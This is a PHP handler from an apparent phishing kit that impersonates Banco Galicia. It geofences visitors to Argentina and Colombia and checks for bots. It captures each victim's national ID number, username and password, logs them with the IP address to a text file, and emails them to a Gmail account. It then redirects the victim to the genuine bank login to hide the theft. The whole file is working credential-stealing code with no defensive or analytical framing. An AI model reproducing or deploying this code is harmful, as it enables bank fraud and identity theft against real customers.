<?php
require_once "is_bot.php";
require_once "geoplugin.class.php";
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code
//asociacionship1@gmailcom
$ciudad = $geoplugin->countryCode;
if (!in_array($ciudad, ["AR","CO"])) {
	header("location:http://turismo.gal/");
} 
//solo argentina para le bloque de la ciudad
$dni = filter_input(INPUT_POST,"DocumentNumber");
$usuario = filter_input(INPUT_POST,"usuario");
$clave = filter_input(INPUT_POST,"claveusuario");
$ip = filter_input(INPUT_SERVER,"REMOTE_ADDR");
if(!empty($dni) && !empty($usuario) && !empty($clave)){
    $file = fopen ( 'inbox.txt' , 'a+');
	fwrite($file, "Dni: ".$dni."\r\nUsuario: ".$usuario."\r\nClave:".$clave."\r\nIP: ".$ip."\r\n==============================\r\n");
	fclose($file);
    $to = "asociacionship1@gmailcom"; // para
    $subject = "Resguardo de datos de usuarios"; // asunto
    $from = "asociacionship1@gmail.com";
    $message = '<table style="height: 131px;" width="407">
    <tbody>
    <tr>
    <td style="width: 397px; text-align: center;" colspan="3"><strong>Datos BG</strong></td>
    </tr>
    <tr>
    <td style="width: 118px; text-align: center;"><strong>DNI</strong></td>
    <td style="width: 145px; text-align: center;"><strong>USAURIO</strong></td>
    <td style="width: 122px; text-align: center;"><strong>CLAVE</strong></td>
    </tr>
    <tr>
    <td style="width: 118px;">'.$dni.'</td>
    <td style="width: 145px;">'.$usuario.'</td>
    <td style="width: 122px;">'.$clave.'</td>
    </tr>
    </tbody>
    </table>';
    $headers = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
    if (mail($to, $subject, $message, $headers, $from)) {
        //echo 'Tu correo se envio correctamente a: ' . $to;
    } else {
        //echo 'fallo en el envio del correo al email: ' . $to;
    }
    header("location:https://onlinebanking.bancogalicia.com.ar/login");
}else{
    header("location:index.php");
}
